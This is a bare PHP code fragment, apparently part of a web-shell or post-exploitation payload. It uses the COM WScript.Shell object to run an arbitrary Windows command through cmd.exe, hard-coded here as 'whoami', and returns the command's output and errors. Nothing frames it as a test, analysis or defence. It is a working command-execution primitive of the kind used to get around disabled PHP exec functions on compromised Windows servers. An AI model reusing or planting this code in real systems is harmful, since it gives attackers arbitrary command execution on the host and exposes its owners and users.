ob_start();

//
if (!class_exists('COM')) {
    ob_end_clean();
    return "ERROR: COM not available";
}

// COMMAND TO EXECUTE
$cmd = 'whoami';

//
try {
    $wsh = new COM('WScript.Shell');
    $exec = $wsh->Exec('cmd.exe /c ' . $cmd . ' 2>&1');
    $output = '';
    while (!$exec->StdOut->AtEndOfStream) {
        $output .= $exec->StdOut->ReadLine() . "\n";
    }
    while (!$exec->StdErr->AtEndOfStream) {
        $output .= $exec->StdErr->ReadLine() . "\n";
    }
    $wsh = null;
    ob_end_clean();
    return $output;
} catch (Exception $e) {
    ob_end_clean();
    return "ERROR: COM execution failed - " . $e->getMessage();
}
